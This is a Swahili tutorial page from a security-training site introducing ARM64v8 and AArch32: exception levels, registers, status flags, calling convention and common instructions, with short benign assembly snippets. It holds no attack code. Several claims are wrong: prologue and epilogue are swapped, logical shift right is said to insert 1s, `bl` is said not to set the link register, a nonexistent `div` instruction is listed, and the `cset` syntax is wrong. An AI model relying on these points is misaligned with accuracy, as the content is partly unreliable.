# Utangulizi wa ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Viwango vya Exception - EL (ARM64v8)**

Katika architecture ya ARMv8, viwango vya utekelezaji, vinavyojulikana kama Exception Levels (ELs), hufafanua kiwango cha privilege na uwezo wa mazingira ya utekelezaji. Kuna viwango vinne vya exception, kuanzia EL0 hadi EL3, na kila kimoja kina madhumuni tofauti:

1. **EL0 - User Mode**:
- Hiki ndicho kiwango chenye privilege ndogo zaidi na hutumika kutekeleza code ya kawaida ya application.
- Applications zinazoendeshwa katika EL0 zimetenganishwa kutoka kwa nyingine na kutoka kwa system software, hivyo kuimarisha usalama na uthabiti.
2. **EL1 - Operating System Kernel Mode**:
- Kernels nyingi za operating system huendeshwa katika kiwango hiki.
- EL1 ina privilege zaidi kuliko EL0 na inaweza kufikia system resources, lakini ikiwa na vikwazo fulani vya kuhakikisha uadilifu wa mfumo. Unatoka EL0 kwenda EL1 kwa kutumia instruction ya `SVC`.
3. **EL2 - Hypervisor Mode**:
- Kiwango hiki hutumika kwa virtualization. Hypervisor inayotumia EL2 inaweza kusimamia operating systems nyingi (kila moja ikiwa katika EL1 yake) zinazoendeshwa kwenye hardware ileile ya kimwili.
- EL2 hutoa vipengele vya kutenganisha na kudhibiti mazingira yaliyovirtualize.
- Kwa hiyo, virtual machine applications kama Parallels zinaweza kutumia `hypervisor.framework` kuwasiliana na EL2 na kuendesha virtual machines bila kuhitaji kernel extensions.
- Ili kuhama kutoka EL1 kwenda EL2, instruction ya `HVC` hutumika.
4. **EL3 - Secure Monitor Mode**:
- Hiki ndicho kiwango chenye privilege ya juu zaidi na mara nyingi hutumika kwa secure booting na trusted execution environments.
- EL3 inaweza kusimamia na kudhibiti access kati ya hali salama na zisizo salama (kama secure boot, trusted OS, n.k.).
- Kilitumika kwa KPP (Kernel Patch Protection) katika macOS, lakini hakitumiki tena.
- EL3 haitumiki tena na Apple.
- Mpito kwenda EL3 kwa kawaida hufanywa kwa kutumia instruction ya `SMC` (Secure Monitor Call).

Matumizi ya viwango hivi huwezesha njia iliyopangwa na salama ya kusimamia vipengele tofauti vya mfumo, kuanzia user applications hadi system software yenye privilege ya juu zaidi. Mbinu ya ARMv8 ya kutumia privilege levels husaidia kutenganisha kwa ufanisi vipengele tofauti vya mfumo, hivyo kuimarisha usalama na uimara wa mfumo.

## **Registers (ARM64v8)**

ARM64 ina **general-purpose registers 31**, zilizopewa majina `x0` hadi `x30`. Kila moja inaweza kuhifadhi thamani ya **64-bit** (bytes 8). Kwa operations zinazohitaji thamani za 32-bit pekee, registers hizo zinaweza kufikiwa katika mode ya 32-bit kwa kutumia majina w0 hadi w30.

1. **`x0`** hadi **`x7`** - Kwa kawaida hutumika kama scratch registers na kwa kupitisha parameters kwenda kwenye subroutines.
- **`x0`** pia hubeba data ya return ya function
2. **`x8`** - Katika Linux kernel, `x8` hutumika kama system call number kwa instruction ya `svc`. **Katika macOS, x16 ndiyo inayotumika!**
3. **`x9`** hadi **`x15`** - Temporary registers zaidi, mara nyingi hutumika kwa local variables.
4. **`x16`** na **`x17`** - **Intra-procedural Call Registers**. Temporary registers za immediate values. Pia hutumika kwa indirect function calls na PLT (Procedure Linkage Table) stubs.
- **`x16`** hutumika kama **system call number** kwa instruction ya **`svc`** katika **macOS**.
5. **`x18`** - **Platform register**. Inaweza kutumika kama general-purpose register, lakini katika baadhi ya platforms register hii huhifadhiwa kwa matumizi maalum ya platform: pointer ya current thread environment block katika Windows, au pointer ya **executing task structure katika linux kernel**.
6. **`x19`** hadi **`x28`** - Hizi ni callee-saved registers. Function lazima ihifadhi thamani za registers hizi kwa ajili ya caller wake, kwa hiyo huhifadhiwa kwenye stack na kurejeshwa kabla ya kurudi kwa caller.
7. **`x29`** - **Frame pointer** ya kufuatilia stack frame. Stack frame mpya inapoundwa kwa sababu function imeitwa, register ya **`x29`** huhifadhiwa kwenye stack na address ya **new** frame pointer (address ya **`sp`**) huhifadhiwa katika register hii.
- Register hii pia inaweza kutumika kama **general-purpose register**, ingawa kwa kawaida hutumika kama reference ya **local variables**.
8. **`x30`** au **`lr`**- **Link register**. Huhifadhi **return address** wakati instruction ya `BL` (Branch with Link) au `BLR` (Branch with Link to Register) inapotekelezwa, kwa kuhifadhi thamani ya **`pc`** katika register hii.
- Inaweza pia kutumika kama register nyingine yoyote.
- Ikiwa current function itaita function mpya na hivyo ku-overwrite `lr`, itaihifadhi kwenye stack mwanzoni; huu ni epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Hifadhi `fp` na `lr`, tengeneza nafasi na pata `fp` mpya), na kuirejesha mwishoni; huu ni prologue (`ldp x29, x30, [sp], #48; ret` -> Rejesha `fp` na `lr` na urudi).
9. **`sp`** - **Stack pointer**, hutumika kufuatilia sehemu ya juu ya stack.
- Thamani ya **`sp`** inapaswa daima kuhifadhiwa ikiwa na **quadword** **alignment** angalau, vinginevyo alignment exception inaweza kutokea.
10. **`pc`** - **Program counter**, inayoelekeza kwenye instruction inayofuata. Register hii inaweza kusasishwa kupitia exception generations, exception returns na branches pekee. Instructions za kawaida pekee zinazoweza kusoma register hii ni branch with link instructions (BL, BLR), kwa kuhifadhi address ya **`pc`** katika **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Pia huitwa **`wzr`** katika mfumo wake wa register ya **32**-bit. Inaweza kutumika kupata thamani ya zero kwa urahisi (operation ya kawaida) au kufanya comparisons kwa kutumia **`subs`**, kama **`subs XZR, Xn, #10`**, huku data inayotokana isihifadhiwe popote (katika **`xzr`**).

Registers za **`Wn`** ni toleo la **32bit** la register ya **`Xn`**.

> [!TIP]
> Registers kutoka X0 - X18 ni volatile, kumaanisha kuwa thamani zake zinaweza kubadilishwa na function calls na interrupts. Hata hivyo, registers kutoka X19 - X28 ni non-volatile, kumaanisha kuwa thamani zake lazima zihifadhiwe wakati wa function calls ("callee saved").

### SIMD and Floating-Point Registers

Zaidi ya hayo, kuna **registers nyingine 32 zenye urefu wa 128bit** zinazoweza kutumika katika optimized single instruction multiple data (SIMD) operations na kufanya floating-point arithmetic. Hizi huitwa Vn registers, ingawa zinaweza pia kufanya kazi katika **64**-bit, **32**-bit, **16**-bit na **8**-bit; katika hali hizo huitwa **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** na **`Bn`**.

### System Registers

**Kuna mamia ya system registers**, pia huitwa special-purpose registers (SPRs), zinazotumika kwa **monitoring** na **controlling** tabia ya **processors**.\
Zinaweza kusomwa au kuwekwa kwa kutumia special instructions maalum pekee, **`mrs`** na **`msr`**.

Special registers **`TPIDR_EL0`** na **`TPIDDR_EL0`** hupatikana mara nyingi wakati wa reversing engineering. Suffix ya `EL0` inaonyesha **minimal exception** ambayo register inaweza kufikiwa (katika hali hii EL0 ndiyo kiwango cha kawaida cha exception (privilege) ambacho regular programs huendeshea).\
Mara nyingi hutumika kuhifadhi **base address ya thread-local storage** memory region. Kwa kawaida ya kwanza inaweza kusomwa na kuandikwa na programs zinazoendeshwa katika EL0, lakini ya pili inaweza kusomwa kutoka EL0 na kuandikwa kutoka EL1 (kama kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** ina process components kadhaa zilizowekwa pamoja katika special register inayoonekana kwa operating system, **`SPSR_ELx`**, ambapo X ni **permission** **level ya exception iliyotokea** (hii huruhusu kurejesha process state exception inapoisha).\
Hizi ndizo fields zinazoweza kufikiwa:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Condition flags **`N`**, **`Z`**, **`C`** na **`V`**:
- **`N`** inamaanisha operation ilitoa matokeo hasi
- **`Z`** inamaanisha operation ilitoa zero
- **`C`** inamaanisha operation ilitoa carry
- **`V`** inamaanisha operation ilitoa signed overflow:
- Jumla ya namba mbili chanya hutoa matokeo hasi.
- Jumla ya namba mbili hasi hutoa matokeo chanya.
- Katika subtraction, namba kubwa hasi inapopunguzwa kutoka kwa namba ndogo chanya (au kinyume chake), na matokeo hayawezi kuwakilishwa ndani ya range ya bit size iliyotolewa.
- Ni wazi kuwa processor haijui ikiwa operation ni signed au la, kwa hiyo hukagua C na V katika operations na kuonyesha ikiwa carry ilitokea katika hali ya signed au unsigned.

> [!WARNING]
> Si instructions zote husasisha flags hizi. Baadhi, kama **`CMP`** au **`TST`**, hufanya hivyo; na nyingine zenye suffix ya s, kama **`ADDS`**, pia hufanya hivyo.

- Flag ya current **register width (`nRW`)**: Ikiwa flag ina thamani 0, program itaendeshwa katika AArch64 execution state itakaporejea.
- **Exception Level** ya sasa (**`EL`**): Regular program inayoendeshwa katika EL0 itakuwa na thamani 0
- Flag ya **single stepping** (**`SS`**): Hutumiwa na debuggers kufanya single step kwa kuweka SS flag kuwa 1 ndani ya **`SPSR_ELx`** kupitia exception. Program itaendesha step moja na kutoa single step exception.
- Flag ya hali ya **illegal exception** (**`IL`**): Hutumika kuonyesha privileged software inapofanya invalid exception level transfer; flag hii huwekwa kuwa 1 na processor hu-trigger illegal state exception.
- Flags za **`DAIF`**: Flags hizi huruhusu privileged program ku-mask kwa kuchagua external exceptions fulani.
- Ikiwa **`A`** ni 1, inamaanisha **asynchronous aborts** zita-triggeriwa. **`I`** husanidi response kwa hardware **Interrupts Requests** (IRQs) za nje, na F inahusiana na **Fast Interrupt Requests** (FIRs).
- Flags za **stack pointer select** (**`SPS`**): Privileged programs zinazoendeshwa katika EL1 na zaidi zinaweza kubadilisha kati ya kutumia stack pointer register yao na ile ya user model (kwa mfano, kati ya `SP_EL1` na `EL0`). Switching hii hufanywa kwa kuandika kwenye special register ya **`SPSel`**. Hili haliwezi kufanywa kutoka EL0.

## **Calling Convention (ARM64v8)**

ARM64 calling convention hubainisha kuwa **parameters nane za kwanza** za function hupitishwa katika registers **`x0`** hadi **`x7`**. Parameters **za ziada** hupitishwa kwenye **stack**. Thamani ya **return** hupitishwa katika register **`x0`**, au katika **`x1`** pia **ikiwa ina urefu wa bits 128**. Registers za **`x19`** hadi **`x30`** na **`sp`** lazima **zihifadhiwe** wakati wa function calls.

Unaposoma function katika assembly, tafuta **function prologue na epilogue**. **Prologue** kwa kawaida huhusisha **kuhifadhi frame pointer (`x29`)**, **kuweka** **frame pointer mpya**, na **kutenga nafasi kwenye stack**. **Epilogue** kwa kawaida huhusisha **kurejesha frame pointer iliyohifadhiwa** na **kurudi** kutoka kwenye function.

### Calling Convention in Swift

Swift ina **calling convention** yake ambayo inaweza kupatikana katika [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Common Instructions (ARM64v8)**

ARM64 instructions kwa kawaida huwa na **format `opcode dst, src1, src2`**, ambapo **`opcode`** ni **operation** inayotekelezwa (kama `add`, `sub`, `mov`, n.k.), **`dst`** ni register ya **destination** ambako result itahifadhiwa, na **`src1`** pamoja na **`src2`** ni registers za **source**. Immediate values pia zinaweza kutumika badala ya source registers.

- **`mov`**: **Hamisha** value kutoka **register** moja kwenda nyingine.
- Example: `mov x0, x1` — Hii huhamisha value kutoka `x1` kwenda `x0`.
- **`ldr`**: **Load** value kutoka **memory** kwenda kwenye **register**.
- Example: `ldr x0, [x1]` — Hii hu-load value kutoka memory location inayoelekezwa na `x1` kwenda `x0`.
- **Offset mode**: Offset inayoathiri origin pointer huonyeshwa, kwa mfano:
- `ldr x2, [x1, #8]`, hii hu-load katika x2 value kutoka x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, hii hu-load katika x2 object kutoka array x0, kwenye position x1 (index) \* 4
- **Pre-indexed mode**: Hii hutumia calculations kwenye origin, hupata result na pia huhifadhi origin mpya kwenye origin.
- `ldr x2, [x1, #8]!`, hii hu-load `x1 + 8` katika `x2` na kuhifadhi katika x1 result ya `x1 + 8`
- `str lr, [sp, #-4]!`, Hifadhi link register katika sp na sasisha register sp
- **Post-index mode**: Hii inafanana na iliyotangulia, lakini memory address hufikiwa kwanza, kisha offset huhesabiwa na kuhifadhiwa.
- `ldr x0, [x1], #8`, load `x1` katika `x0` na sasisha x1 kwa `x1 + 8`
- **PC-relative addressing**: Katika hali hii address ya ku-load huhesabiwa relative kwa PC register
- `ldr x1, =_start`, Hii hu-load address ambako symbol ya `_start` inaanzia katika x1 relative kwa current PC.
- **`str`**: **Store** value kutoka **register** kwenda kwenye **memory**.
- Example: `str x0, [x1]` — Hii huhifadhi value iliyo katika `x0` kwenye memory location inayoelekezwa na `x1`.
- **`ldp`**: **Load Pair of Registers**. Instruction hii **hu-load registers mbili** kutoka **memory locations zinazofuatana**. Memory address kwa kawaida huundwa kwa kuongeza offset kwenye value ya register nyingine.
- Example: `ldp x0, x1, [x2]` — Hii hu-load `x0` na `x1` kutoka memory locations zilizo katika `x2` na `x2 + 8`, mtawalia.
- **`stp`**: **Store Pair of Registers**. Instruction hii **huhifadhi registers mbili** kwenye **memory locations zinazofuatana**. Memory address kwa kawaida huundwa kwa kuongeza offset kwenye value ya register nyingine.
- Example: `stp x0, x1, [sp]` — Hii huhifadhi `x0` na `x1` katika memory locations zilizo kwenye `sp` na `sp + 8`, mtawalia.
- `stp x0, x1, [sp, #16]!` — Hii huhifadhi `x0` na `x1` kwenye memory locations zilizo katika `sp+16` na `sp + 24`, mtawalia, na kusasisha `sp` kwa `sp+16`.
- **`add`**: **Jumlisha** values za registers mbili na kuhifadhi result katika register.
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operando 2 (register au immediate)
- \[shift #N | RRX] -> Fanya shift au ita RRX
- Example: `add x0, x1, x2` — Hii hujumlisha values zilizo katika `x1` na `x2` na kuhifadhi result katika `x0`.
- `add x5, x5, #1, lsl #12` — Hii ni sawa na 4096 (1 iliyoshift mara 12) -> 1 0000 0000 0000 0000
- **`adds`** Hii hufanya `add` na kusasisha flags
- **`sub`**: **Ondoa** value za registers mbili na kuhifadhi result katika register.
- Angalia **`add`** **syntax**.
- Example: `sub x0, x1, x2` — Hii huondoa value ya `x2` kutoka `x1` na kuhifadhi result katika `x0`.
- **`subs`** Hii ni kama sub lakini husasisha flag
- **`mul`**: **Zidisha** values za **registers mbili** na kuhifadhi result katika register.
- Example: `mul x0, x1, x2` — Hii huzidisha values za `x1` na `x2` na kuhifadhi result katika `x0`.
- **`div`**: **Gawanya** value ya register moja kwa nyingine na kuhifadhi result katika register.
- Example: `div x0, x1, x2` — Hii hugawanya value ya `x1` kwa `x2` na kuhifadhi result katika `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Ongeza 0 kutoka mwisho huku ukisogeza bits nyingine mbele (zidisha kwa n-times 2)
- **Logical shift right**: Ongeza 1 mwanzoni huku ukisogeza bits nyingine nyuma (gawanya kwa n-times 2 katika unsigned)
- **Arithmetic shift right**: Kama **`lsr`**, lakini badala ya kuongeza 0 ikiwa most significant bit ni 1, **1 huongezwa (gawanya kwa ntimes 2 katika signed)
- **Rotate right**: Kama **`lsr`**, lakini chochote kinachoondolewa upande wa kulia huongezwa upande wa kushoto
- **Rotate Right with Extend**: Kama **`ror`**, lakini carry flag hutumika kama "most significant bit". Kwa hiyo carry flag huhamishwa kwenda bit 31 na bit iliyoondolewa huenda kwenye carry flag.
- **`bfm`**: **Bit Filed Move**, operations hizi **hukinakili bits `0...n`** kutoka kwenye value na kuziweka katika positions **`m..m+n`**. **`#s`** hubainisha position ya **leftmost bit** na **`#r`** kiasi cha rotate right.
- Bitfiled move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Hukinakili bitfield kutoka register moja na kui-copy kwenye register nyingine.
- **`BFI X1, X2, #3, #4`** Insert bits 4 kutoka X2 kuanzia bit ya 3 ya X1
- **`BFXIL X1, X2, #3, #4`** Extract bits nne kutoka bit ya 3 ya X2 na kuzi-copy kwenda X1
- **`SBFIZ X1, X2, #3, #4`** Sign-extends bits 4 kutoka X2 na kuzi-insert katika X1 kuanzia bit position 3, huku iki-zero bits za kulia
- **`SBFX X1, X2, #3, #4`** Hu-extract bits 4 zinazoanzia bit 3 kutoka X2, hu-sign-extend na kuweka result katika X1
- **`UBFIZ X1, X2, #3, #4`** Zero-extends bits 4 kutoka X2 na kuzi-insert katika X1 kuanzia bit position 3, huku iki-zero bits za kulia
- **`UBFX X1, X2, #3, #4`** Hu-extract bits 4 zinazoanzia bit 3 kutoka X2 na kuweka result iliyo-zero-extended katika X1.
- **Sign Extend To X:** Hu-extend sign (au huongeza 0 pekee katika unsigned version) ya value ili kuweza kufanya operations nayo:
- **`SXTB X1, W2`** Hu-extend sign ya byte **kutoka W2 kwenda X1** (`W2` ni nusu ya `X2`) ili kujaza bits 64
- **`SXTH X1, W2`** Hu-extend sign ya namba ya 16bit **kutoka W2 kwenda X1** ili kujaza bits 64
- **`SXTW X1, W2`** Hu-extend sign ya byte **kutoka W2 kwenda X1** ili kujaza bits 64
- **`UXTB X1, W2`** Huongeza 0 (unsigned) kwenye byte **kutoka W2 kwenda X1** ili kujaza bits 64
- **`extr`:** Hu-extract bits kutoka **pair maalum ya registers zilizounganishwa**.
- Example: `EXTR W3, W2, W1, #3` Hii ita-**concat W1+W2** na kuchukua **kuanzia bit 3 ya W2 hadi bit 3 ya W1**, kisha kuhifadhi katika W3.
- **`cmp`**: **Linganisha** registers mbili na kuweka condition flags. Ni **alias ya `subs`** inayoweka destination register kuwa zero register. Ni muhimu kujua ikiwa `m == n`.
- Inasaidia **syntax ileile ya `subs`**
- Example: `cmp x0, x1` — Hii hulinganisha values zilizo katika `x0` na `x1` na kuweka condition flags ipasavyo.
- **`cmn`**: **Compare negative** operand. Katika hali hii ni **alias ya `adds`** na inasaidia syntax ileile. Ni muhimu kujua ikiwa `m == -n`.
- **`ccmp`**: Conditional comparison; ni comparison inayotekelezwa tu ikiwa comparison iliyotangulia ilikuwa true na itaweka bits za nzcv mahususi.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> ikiwa x1 != x2 na x3 < x4, jump kwenda func
- Hii ni kwa sababu **`ccmp`** itatekelezwa tu ikiwa **`cmp` iliyotangulia ilikuwa `NE`**; ikiwa haikuwa hivyo, bits za `nzcv` zitawekwa kuwa 0 (ambazo hazitatimiza comparison ya `blt`).
- Hii pia inaweza kutumika kama `ccmn` (ileile lakini negative, kama `cmp` dhidi ya `cmn`).
- **`tst`**: Hukagua ikiwa values za comparison zote mbili ni 1 (hufanya kazi kama ANDS bila kuhifadhi result popote). Ni muhimu kukagua register dhidi ya value na kuona ikiwa bits zozote za register zilizoonyeshwa katika value ni 1.
- Example: `tst X1, #7` Hukagua ikiwa mojawapo ya bits 3 za mwisho za X1 ni 1
- **`teq`**: XOR operation inayotupa result
- **`b`**: Unconditional Branch
- Example: `b myFunction`
- Kumbuka kuwa hii haitajaza link register kwa return address (haifai kwa subrutine calls zinazohitaji kurudi)
- **`bl`**: **Branch** with link, hutumika **kuita** **subroutine**. Huhifadhi **return address katika `x30`**.
- Example: `bl myFunction` — Hii huita function `myFunction` na kuhifadhi return address katika `x30`.
- Kumbuka kuwa hii haitajaza link register kwa return address (haifai kwa subrutine calls zinazohitaji kurudi)
- **`blr`**: **Branch** with Link to Register, hutumika **kuita** **subroutine** ambayo target yake **imebainishwa** katika **register**. Huhifadhi return address katika `x30`. (Hii ni
- Example: `blr x1` — Hii huita function ambayo address yake iko katika `x1` na kuhifadhi return address katika `x30`.
- **`ret`**: **Rudi** kutoka **subroutine**, kwa kawaida kwa kutumia address iliyo katika **`x30`**.
- Example: `ret` — Hii hurudi kutoka current subroutine kwa kutumia return address iliyo katika `x30`.
- **`b.<cond>`**: Conditional branches
- **`b.eq`**: **Branch if equal**, kulingana na instruction ya `cmp` iliyotangulia.
- Example: `b.eq label` — Ikiwa instruction ya `cmp` iliyotangulia ilipata values mbili zilizo sawa, hii huruka kwenda `label`.
- **`b.ne`**: **Branch if Not Equal**. Instruction hii hukagua condition flags (zilizowekwa na comparison instruction iliyotangulia), na ikiwa values zilizolinganishwa hazikuwa sawa, huruka kwenda label au address.
- Example: Baada ya instruction ya `cmp x0, x1`, `b.ne label` — Ikiwa values za `x0` na `x1` hazikuwa sawa, hii huruka kwenda `label`.
- **`cbz`**: **Compare and Branch on Zero**. Instruction hii hulinganisha register na zero, na ikiwa ni sawa, huruka kwenda label au address.
- Example: `cbz x0, label` — Ikiwa value ya `x0` ni zero, hii huruka kwenda `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Instruction hii hulinganisha register na zero, na ikiwa hazilingani, huruka kwenda label au address.
- Example: `cbnz x0, label` — Ikiwa value ya `x0` si zero, hii huruka kwenda `label`.
- **`tbnz`**: Test bit and branch on nonzero
- Example: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- Example: `tbz x0, #8, label`
- **Conditional select operations**: Hizi ni operations ambazo tabia yake hubadilika kulingana na conditional bits.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Ikiwa true, X0 = X1, ikiwa false, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Ikiwa true, Xd = Xn, ikiwa false, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Ikiwa true, Xd = Xn + 1, ikiwa false, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Ikiwa true, Xd = Xn, ikiwa false, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Ikiwa true, Xd = NOT(Xn), ikiwa false, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Ikiwa true, Xd = Xn, ikiwa false, Xd = - Xm
- `cneg Xd, Xn, cond` -> Ikiwa true, Xd = - Xn, ikiwa false, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Ikiwa true, Xd = 1, ikiwa false, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Ikiwa true, Xd = \<all 1>, ikiwa false, Xd = 0
- **`adrp`**: Kokotoa **page address ya symbol** na kuihifadhi katika register.
- Example: `adrp x0, symbol` — Hii hukokotoa page address ya `symbol` na kuihifadhi katika `x0`.
- **`ldrsw`**: **Load** signed **32-bit** value kutoka memory na **sign-extend hadi** bits **64**. Hii hutumika katika SWITCH cases za kawaida.
- Example: `ldrsw x0, [x1]` — Hii hu-load signed 32-bit value kutoka memory location inayoelekezwa na `x1`, hu-sign-extend hadi bits 64, na kuihifadhi katika `x0`.
- **`stur`**: **Hifadhi register value kwenye memory location**, ukitumia offset kutoka register nyingine.
- Example: `stur x0, [x1, #4]` — Hii huhifadhi value ya `x0` katika memory address iliyo bytes 4 zaidi ya address iliyopo kwa sasa katika `x1`.
- **`svc`** : Fanya **system call**. Inasimamia "Supervisor Call". Processor inapotekeleza instruction hii, **hubadilika kutoka user mode kwenda kernel mode** na kuruka kwenye location maalum ya memory ambako code ya **kernel ya kushughulikia system call** iko.

- Example:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Hifadhi link register na frame pointer kwenye stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Weka frame pointer mpya**: `mov x29, sp` (huweka frame pointer mpya kwa function ya sasa)
3. **Tenga nafasi kwenye stack kwa ajili ya local variables** (ikiwa inahitajika): `sub sp, sp, <size>` (ambapo `<size>` ni idadi ya bytes zinazohitajika)

### **Epilogue ya Function**

1. **Ondoa local variables** (ikiwa zilitengwa): `add sp, sp, <size>`
2. **Rejesha link register na frame pointer**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (hurejesha udhibiti kwa caller kwa kutumia anwani iliyo kwenye link register)

## Common Memory Protections za ARM

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## Hali ya Utekelezaji ya AARCH32

Armv8-A inaunga mkono utekelezaji wa programs za 32-bit. **AArch32** inaweza kuendesha mojawapo ya **instruction sets mbili**: **`A32`** na **`T32`**, na inaweza kubadilisha kati yao kupitia **`interworking`**.\
Programs za **Privileged** za 64-bit zinaweza kupanga **utekelezaji wa programs za 32-bit** kwa kutekeleza uhamishaji wa exception level kwenda kwenye 32-bit yenye privilege ya chini.\
Kumbuka kwamba mabadiliko kutoka 64-bit kwenda 32-bit hutokea pamoja na kushuka kwa exception level (kwa mfano, program ya 64-bit katika EL1 ikianzisha program katika EL0). Hili hufanywa kwa kuweka **bit 4 ya** special register **`SPSR_ELx`** **kuwa 1** wakati thread ya process ya `AArch32` iko tayari kutekelezwa, huku sehemu iliyobaki ya `SPSR_ELx` ikihifadhi CPSR ya programs za **`AArch32`**. Kisha process yenye privilege ya juu huita instruction ya **`ERET`**, ili processor ibadilike kwenda **`AArch32`**, ikiingia katika A32 au T32 kulingana na CPSR**.**

**`interworking`** hutokea kwa kutumia bits za J na T za CPSR. `J=0` na `T=0` humaanisha **`A32`**, na `J=0` na `T=1` humaanisha **T32**. Kimsingi, hii hutafsiriwa kama kuweka **bit ya chini kuwa 1** ili kuonyesha kwamba instruction set ni T32.\
Hii huwekwa wakati wa **interworking branch instructions,** lakini inaweza pia kuwekwa moja kwa moja kwa kutumia instructions nyingine wakati PC imewekwa kama destination register. Mfano:

Mfano mwingine:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registers

Kuna registers 16 za biti 32 (`r0-r15`). **Kuanzia r0 hadi r14** zinaweza kutumika kwa **operesheni yoyote**, hata hivyo baadhi yao kwa kawaida hutengewa matumizi maalum:

- **`r15`**: Program counter (daima). Ina anwani ya instruction inayofuata. Katika A32 ni current + 8, na katika T32 ni current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural call register
- **`r13`**: Stack Pointer (Kumbuka kuwa stack huwa aligned kwa 16-byte)
- **`r14`**: Link Register

Zaidi ya hayo, registers huhifadhiwa katika **`banked registries`**. Hizi ni sehemu zinazohifadhi values za registers na kuruhusu **fast context switching** wakati wa exception handling na privileged operations, ili kuepuka hitaji la kuhifadhi na kurejesha registers manually kila mara.\
Hili hufanywa kwa **kuhifadhi processor state kutoka `CPSR` kwenda `SPSR`** ya processor mode ambayo exception imepelekwa. Wakati wa kurudi kutoka kwenye exception, **`CPSR`** hurejeshwa kutoka kwenye **`SPSR`**.

### CPSR - Current Program Status Register

Katika AArch32, CPSR hufanya kazi kwa njia inayofanana na **`PSTATE`** katika AArch64 na pia huhifadhiwa katika **`SPSR_ELx`** wakati exception inapotokea, ili execution irejeshwe baadaye:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Fields zimegawanywa katika makundi kadhaa:

- Application Program Status Register (APSR): Arithmetic flags zinazoweza kufikiwa kutoka EL0
- Execution State Registers: Tabia ya process (inayosimamiwa na OS).

#### Application Program Status Register (APSR)

- Flags za **`N`**, **`Z`**, **`C`**, **`V`** (kama zilivyo katika AArch64)
- Flag ya **`Q`**: Hupewa thamani 1 kila **integer saturation inapotokea** wakati wa kutekeleza specialized saturating arithmetic instruction. Mara inapowekwa kuwa **`1`**, itaendelea kubeba value hiyo hadi iwekwe kuwa 0 manually. Zaidi ya hayo, hakuna instruction inayokagua value yake implicitly; lazima isomwe manually.
- Flags za **`GE`** (Greater than or equal): Hutumika katika operesheni za SIMD (Single Instruction, Multiple Data), kama vile "parallel add" na "parallel subtract". Operesheni hizi huruhusu kuchakata data points nyingi kwa instruction moja.

Kwa mfano, instruction ya **`UADD8`** **huongeza pairs nne za bytes** (kutoka operands mbili za 32-bit) kwa parallel na kuhifadhi results katika register ya 32-bit. Kisha huweka **flags za `GE` katika `APSR`** kulingana na results hizo. Kila GE flag inalingana na moja ya byte additions, ikionyesha ikiwa addition ya byte pair hiyo **ilisababisha overflow**.

Instruction ya **`SEL`** hutumia flags hizi za GE kufanya conditional actions.

#### Execution State Registers

- Bits za **`J`** na **`T`**: **`J`** inapaswa kuwa 0, na ikiwa **`T`** ni 0 instruction set A32 hutumika; ikiwa ni 1, T32 hutumika.
- **IT Block State Register** (`ITSTATE`): Hizi ni bits za 10-15 na 25-26. Huhifadhi conditions za instructions zilizo ndani ya group iliyoanzishwa na **`IT`**.
- Bit ya **`E`**: Huonyesha **endianness**.
- **Mode and Exception Mask Bits** (0-4): Huamua execution state ya sasa. Ya 5 huonyesha ikiwa program inaendeshwa kama 32-bit (ikiwa ni 1) au 64-bit (ikiwa ni 0). Nne zilizobaki huwakilisha **exception mode inayotumika kwa sasa** (exception inapotokea na kushughulikiwa). Namba iliyowekwa **huonyesha priority ya sasa** ikiwa exception nyingine itatokea wakati hii inashughulikiwa.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Exceptions fulani zinaweza kuzimwa kwa kutumia bits **`A`**, `I`, `F`. Ikiwa **`A`** ni 1, inamaanisha **asynchronous aborts** zitasababishwa. **`I`** husanidi mfumo kujibu **Interrupts Requests** (IRQs) kutoka external hardware, na `F` inahusiana na **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

